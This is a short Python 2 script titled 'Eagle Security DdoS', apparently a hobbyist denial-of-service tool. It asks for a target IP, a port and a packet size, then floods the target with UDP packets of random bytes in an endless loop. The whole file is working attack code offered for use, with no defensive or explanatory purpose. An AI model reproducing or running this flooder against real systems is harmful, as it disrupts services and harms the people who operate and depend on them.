import sys
import os
import random
import socket
from sys import platform





if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
    print "If It Does Not Work Please Try Using It On Linux"
elif platform == "win32":
    os.system("cls")
else:
    print "\033[1;34m [-]Unknown System Detected \033[1;m"

print "\033[1;32m"

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print """

Eagle Security DdoS
  
=======================================
     Created By: ISLI
=======================================
"""



try:
    size = input("bytes: ")
    attack = random._urandom(size)
    ip = raw_input("Target IP: ")
    port = input("port: ")
    print " "
    print "Starting Attack"
    print " "
except SyntaxError:
    print " "
    exit("\033[1;34m ERROR \033[1;m")
except NameError:
    print " "
    exit("\033[1;34m Invalid Input \033[1;m")
except KeyboardInterrupt:
    print " "
    exit("\033[1;34m [-]Canceled \033[1;m")
except ImportError:
    print " "
    exit("\033[1;34m [-]Install python 2.7.15")


while True:
    try:
        connect.sendto(attack, (ip, port))
        print "Attacking..."
    except KeyboardInterrupt:
        print " "
        exit("\033[1;34m [-]Canceled \033[1;m")
    except ImportError:
        print " "
        exit("\033[1;34m [-]Install python 2.7.15")